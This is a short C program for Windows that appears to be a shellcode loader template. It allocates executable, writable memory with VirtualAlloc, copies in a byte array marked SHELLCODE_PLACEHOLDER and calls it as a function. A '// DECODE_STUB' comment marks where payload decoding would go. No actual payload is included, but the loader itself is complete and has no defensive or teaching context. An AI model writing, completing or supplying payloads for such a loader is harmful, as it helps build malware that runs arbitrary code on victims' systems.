#include <windows.h>
#include <stdio.h>

unsigned char shellcode[] = SHELLCODE_PLACEHOLDER;

int main() {
    void *exec = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!exec) return -1;

    memcpy(exec, shellcode, sizeof(shellcode));

    // DECODE_STUB

    ((void(*)())exec)();
    return 0;
}
